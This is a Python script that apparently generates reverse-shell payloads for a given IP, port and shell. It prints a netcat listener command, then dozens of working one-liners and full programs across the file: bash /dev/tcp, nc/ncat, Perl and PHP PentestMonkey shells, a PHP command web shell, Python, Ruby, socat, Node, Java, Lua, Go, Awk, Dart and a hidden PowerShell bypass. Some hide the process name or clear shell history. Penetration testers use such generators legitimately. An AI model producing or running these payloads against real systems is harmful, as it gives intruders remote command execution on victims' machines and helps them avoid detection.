def main(ip, port, shells):
    print("\n-----------------Listener-----------------")
    print(f"\nnc -lvnp {port}")
    print("\n-----------------Reverse-----------------\n\n")
def bash(ip, port, shells):
    print(f"\n----------------------------------\n # Bash -i \n\n{shells} -i >& /dev/tcp/{ip}/{port} 0>&1")
    print(f"\n----------------------------------\n # Bash 196 \n\n0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shells} <&196 >&196 2>&196")
    print(f"\n----------------------------------\n # Bash read line \n\nexec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done")
    print(f"\n----------------------------------\n # Bash 5 \n\n{shells} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5")
    print(f"\n----------------------------------\n # Bash udp \n\n{shells} -i >& /dev/udp/{ip}/{port} 0>&1")
def nc(ip, port, shells):
    print(f"\n----------------------------------\n # nc mkfifo \n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shells} -i 2>&1|nc {ip} {port} >/tmp/f")
    print(f"\n----------------------------------\n # nc -e \n\nnc {ip} {port} -e {shells}")
    print(f"\n----------------------------------\n # nc -c \n\nnc -c {shells} {ip} {port}")
    print(f"\n----------------------------------\n # ncat -e \n\nncat {ip} {port} -e {shells} ")
    print(f"\n----------------------------------\n # ncat udp \n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shells} -i 2>&1|ncat -u {ip} {port} >/tmp/f")
    print(f"\n----------------------------------\n # rustcat \n\nrcat {ip} {port} -r {shells}")
def C(ip, port, shells):
    print('''\n----------------------------------\n # C \n\n#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = ''' + str(port) +''';
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("''' + ip + '''");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"''' + shells + '''", NULL};
    execve("sh", argv, NULL);

    return 0;       
}''')
def CSharp(ip, port, shells):
    print('''\n----------------------------------\n # C# TCP Client \n\nusing System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("''' + ip + '''", ''' + str(port) + '''))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "''' + shells + '''";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}''')
    print('''\n----------------------------------\n # C# bash -i \n\nusing System;
using System.Diagnostics;

namespace BackConnect {
  class ReverseBash {
	public static void Main(string[] args) {
	  Process proc = new System.Diagnostics.Process();
	  proc.StartInfo.FileName = "''' + shells + '''";
	  proc.StartInfo.Arguments = "-c \\"''' + shells + ''' -i >& /dev/tcp/''' + ip + '''/''' + str(port) + ''' 0>&1\"";
	  proc.StartInfo.UseShellExecute = false;
	  proc.StartInfo.RedirectStandardOutput = true;
	  proc.Start();

	  while (!proc.StandardOutput.EndOfStream) {
		Console.WriteLine(proc.StandardOutput.ReadLine());
	  }
	}
  }
}''')
def haskell(ip, port, shells):
    print(f'''\n----------------------------------\n # Haskell #1 \n\nmodule Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | ''' + shells + ''' -i 2>&1 | nc ''' + ip + ''' ''' + str(port) + ''' >/tmp/f"''')
def perl(ip, port, shells):
    print("""\n----------------------------------\n # Perl \n\nperl -e 'use Socket;$i="""+ '''"''' + ip +  '''"''' + """;$p=""" + str(port) + """;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec(""" + shells + """ -i");};'""")
    print("""\n----------------------------------\n # Perl no sh \n\nperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,""" + str('''"''') + ip + """:""" + str(port) + str('''"''') + """);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""")
    print("""\n----------------------------------\n # Perl PentestMonkey \n\nuse strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell.  Change these.
my $ip = '""" + ip + """';
my $port = """ + str(port) + """;

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any 
		# source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
	cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

	if ($auth) {
		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
			cgiprint("ERROR: Your client isn't authorised to view this page");
			cgiexit();
		}
	}
} elsif ($auth) {
	cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
	cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
	my $pid = fork();
	if ($pid) {
		cgiexit(0); # parent exits
	}

	setsid();
	chdir('/');
	umask(0);
}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
	cgiprint("Sent reverse shell to $ip:$port");
	cgiprintpage();
} else {
	cgiprint("Couldn't open reverse shell to $ip:$port: $!");
	cgiexit();	
}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({""" + str('''"''') + shells + str('''"''') + """} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {
	my $line = shift;
	$line .= "<p>\\n";
	$global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
	cgiprintpage();
	exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
	print "Content-Length: " . length($global_page) . "\\r
Connection: close\\r
Content-Type: text\/html\\r\\n\\r\\n" . $global_page;
}""")
def PHP(ip, port, shells):
    print("""\n----------------------------------\n # PHP PentestMonkey \n\n<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '""" + ip + """';
$port = """ + str(port) + """;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; """ + shells + """ -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>""")
    print("""\n----------------------------------\n # PHP Ivan Sincek \n\n<?php
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'sh';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\\\\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('""" + ip + """', """ + str(port) + """);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>""")
    print("""\n----------------------------------\n # PHP cmd \n\n<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>""")
    print("""\n----------------------------------\n # PHP exec \n\nphp -r '$sock=fsockopen(""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """);exec(""" + str('''"''') + shells + """ <&3 >&3 2>&3");'""")
    print("""\n----------------------------------\n # PHP shell_exec \n\nphp -r '$sock=fsockopen(""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """);shell_exec(""" + str('''"''') + shells + """ <&3 >&3 2>&3");'""")
    print("""\n----------------------------------\n # PHP system \n\nphp -r '$sock=fsockopen(""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """);system(""" + str('''"''') + shells + """ <&3 >&3 2>&3");'""")
    print("""\n----------------------------------\n # PHP passthru \n\nphp -r '$sock=fsockopen(""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """);passthru(""" + str('''"''') + shells + """ <&3 >&3 2>&3");'""")
    print("""\n----------------------------------\n # PHP` \n\nphp -r '$sock=fsockopen(""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """);`""" + shells + """ <&3 >&3 2>&3`;'""")
    print("""\n----------------------------------\n # PHP popen \n\nphp -r '$sock=fsockopen(""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """);popen(""" + str('''"''') + shells + """ <&3 >&3 2>&3", "r");'""")
    print("""\n----------------------------------\n # PHP proc_open \n\nphp -r '$sock=fsockopen(""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """);$proc=proc_open(""" + str('''"''') + shells + str('''"''') + """, array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""")
def python_shell(ip, port, shells):
    print("""\n----------------------------------\n # Python #1 \n\nexport RHOST=""" + str('''"''') + ip + str('''"''') + """;export RPORT=""" + str(port) + """;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""" + str('''"''') + shells + str('''"''') + """)'""")
    print("""\n----------------------------------\n # Python #2 \n\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""" + str('''"''') + shells + str('''"''') + """)'""")
    print("""\n----------------------------------\n # Python3 #1 \n\nexport RHOST=""" + str('''"''') + ip + str('''"''') + """;export RPORT=""" + str(port) + """;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""" + str('''"''') + shells + str('''"''') + """)'""")
    print("""\n----------------------------------\n # Python3 #2 \n\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""" + str('''"''') + shells + str('''"''') + """)'""")
    print("""\n----------------------------------\n # Python3 Windows \n\nimport os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """))

p=subprocess.Popen([""" + str('''"''') + shells + str('''"''') + """], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()""")
    print("""\n----------------------------------\n # Python3 shortest \n\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect((""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(""" + str('''"''') + shells + str('''"''') + """)'""")
def ruby(ip, port, shells):
    print("""\n----------------------------------\n # Ruby \n\nruby -rsocket -e'spawn(""" + str('''"''') + shells + str('''"''') + """,[:in,:out,:err]=>TCPSocket.new(""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """))'""")
    print("""\n----------------------------------\n # Ruby no sh \n\nruby -rsocket -e'exit if fork;c=TCPSocket.new(""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """,""" + str('''"''') + str(port) + str('''"''') + """,""" + str(port) + """);loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'""")
def socat(ip, port, shells):
    print("""\n----------------------------------\n # socat #1 \n\nsocat TCP:""" + ip + """:""" + str(port) + """ EXEC:""" + shells + """""")
    print("""\n----------------------------------\n # socat #2 (TTY) \n\nsocat TCP:""" + ip + """:""" + str(port) + """ EXEC:'""" + shells + """',pty,stderr,setsid,sigint,sane""")
def nodeJS(ip, port, shells):
    print("""\n----------------------------------\n # node.js \n\nrequire('child_process').exec('nc -e """ + shells + """ """ + ip + """ """ + str(port) + """')""")
    print("""\n----------------------------------\n # node.js #2 \n\n(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn(""" + str('''"''') + shells + str('''"''') + """, []);
    var client = new net.Socket();
    client.connect(""" + str(port) + """, """ + str('''"''') + ip + str('''"''') + """, function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();""")
def java(ip, port, shells):
    print("""\n\n----------------------------------\n # Java #1 \n\npublic class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/""" + ip + """/""" + str(port) + """ 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}""")
    print("""\n\n----------------------------------\n # Java #2 \n\npublic class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/""" + ip + """/""" + str(port) + """ 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}""")
    print("""\n\n----------------------------------\n # Java #3 \n\nimport java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        String host = """ + str('''"''') + ip + str('''"''') + """;
        int port = """ + str(port) + """;
        String cmd = """ + str('''"''') + shells + str('''"''') + """;
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}""")
def Javascript(ip, port, shells):
    print("""\n\n----------------------------------\n # Javascript \n\nString command = "var host = '""" + ip + """';" +
                       "var port = """ + str(port) + """;" +
                       "var cmd = '""" + shells + """';"+
                       "var s = new java.net.Socket(host, port);" +
                       "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
                       "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
                       "var po = p.getOutputStream(), so = s.getOutputStream();"+
                       "print ('Connected');"+
                       "while (!s.isClosed()) {"+
                       "    while (pi.available() > 0)"+
                       "        so.write(pi.read());"+
                       "    while (pe.available() > 0)"+
                       "        so.write(pe.read());"+
                       "    while (si.available() > 0)"+
                       "        po.write(si.read());"+
                       "    so.flush();"+
                       "    po.flush();"+
                       "    java.lang.Thread.sleep(50);"+
                       "    try {"+
                       "        p.exitValue();"+
                       "        break;"+
                       "    }"+
                       "    catch (e) {"+
                       "    }"+
                       "}"+
                       "p.destroy();"+
                       "s.close();";
String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
ref.add(new StringRefAddr("x", x);""")
def Groovy(ip, port, shells):
    print("""\n\n----------------------------------\n # Groovy \n\nString host=""" + str('''"''') + ip + str('''"''') + """;int port=""" + str(port) + """;String cmd=""" + str('''"''') + shells + str('''"''') + """;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();""")
def telnet(ip, port, shells):
    print("\n\n----------------------------------\n # Telnet \n\nTF=$(mktemp -u);mkfifo $TF && telnet " + ip + " " + str(port) + " 0<$TF | " + shells + " 1>$TF")
def zsh(ip, port, shells):
    print("\n\n----------------------------------\n # zsh \n\nzsh -c 'zmodload zsh/net/tcp && ztcp " + ip + " " + str(port) + " && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'")
def lua(ip, port, shells):
    print('''\n\n----------------------------------\n # Lua #1 \n\nlua -e "require('socket');require('os');t=socket.tcp();t:connect(''' + str("'") + ip + str("'") + ''',''' + str("'") + str(port) + str("'") + ''');os.execute(''' + str("'") + shells + ''' -i <&3 >&3 2>&3');"''')
    print('''\n\n----------------------------------\n # Lua #2 \n\nlua5.1 -e 'local host, port = "''' + ip + '''", ''' + str(port) + ''' local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' ''')
def Golang(ip, port, shells):
    print("""\n\n----------------------------------\n # Golang \n\necho 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp",""" + str('''"''') + ip + """:""" + str(port) + str('''"''') + """);cmd:=exec.Command(""" + str('''"''') + shells + str('''"''') + """);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""")
def Vlang(ip, port, shells):
    print("""\n\n----------------------------------\n # Vlang \n\necho 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e """ + shells + """ """ + ip + """ """ + str(port) + """ 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v""")
def Awk(ip, port, shells):
    print("""\n\n----------------------------------\n # Awk \n\nawk 'BEGIN {s = "/inet/tcp/0/""" + ip + """/""" + str(port) + str('''"''') + """; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null""")
def Dart(ip, port, shells):
    print("""\n\n----------------------------------\n # Dart \n\nimport 'dart:io';
import 'dart:convert';

main() {
  Socket.connect(""" + str('''"''') + ip + str('''"''') + """, """ + str(port) + """).then((socket) {
    socket.listen((data) {
      Process.start('""" + shells + """', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}""")

def powershell(ip, port):
    print("""\n\n----------------------------------\n # Powershell #1 \n\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(""" + str('''"''') + ip + str('''"''') + """,""" + str(port) + """);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""")
